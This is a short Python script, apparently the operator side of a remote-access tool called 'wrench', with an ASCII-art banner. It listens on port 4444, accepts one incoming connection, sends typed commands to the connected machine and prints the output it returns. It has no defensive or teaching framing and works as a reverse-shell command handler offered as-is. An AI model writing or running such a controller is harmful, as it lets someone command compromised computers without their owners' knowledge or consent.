import socket
print(r"""
  _____                _____        ______  _____   ______         _____    ____   ____ 
 |\    \   _____   ___|\    \   ___|\     \|\    \ |\     \    ___|\    \  |    | |    |
 | |    | /    /| |    |\    \ |     \     \\\    \| \     \  /    /\    \ |    | |    |
 \/     / |    || |    | |    ||     ,_____/|\|    \  \     ||    |  |    ||    |_|    |
 /     /_  \   \/ |    |/____/ |     \--'\_|/ |     \  |    ||    |  |____||    .-.    |
|     // \  \   \ |    |\    \ |     /___/|   |      \ |    ||    |   ____ |    | |    |
|    |/   \ |    ||    | |    ||     \____|\  |    |\ \|    ||    |  |    ||    | |    |
|\ ___/\   \|   /||____| |____||____ '     /| |____||\_____/||\ ___\/    /||____| |____|
| |   | \______/ ||    | |    ||    /_____/ | |    |/ \|   ||| |   /____/ ||    | |    |
 \|___|/\ |    | ||____| |____||____|     | / |____|   |___|/ \|___|    | /|____| |____|
    \(   \|____|/   \(     )/    \( |_____|/    \(       )/     \( |____|/   \(     )/  
     '      )/       '     '      '    )/        '       '       '   )/       '     '
""")
print("\n****************************************************************")
print("\n* Copyright of wrench project, 2025                           *")
print("\n****************************************************************")
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((LISTEN_IP, LISTEN_PORT))
server_socket.listen(1)

print("Waiting for connection...")
conn, addr = server_socket.accept()
print(f"Connected by {addr}")

try:
    while True:
        cmd = input("Enter command or 'say <message>': ")
        if cmd.lower() == "exit":
            break

        conn.send(cmd.encode())

        # Receive output
        data = conn.recv(4096)
        print(data.decode())
finally:
    conn.close()
    server_socket.close()
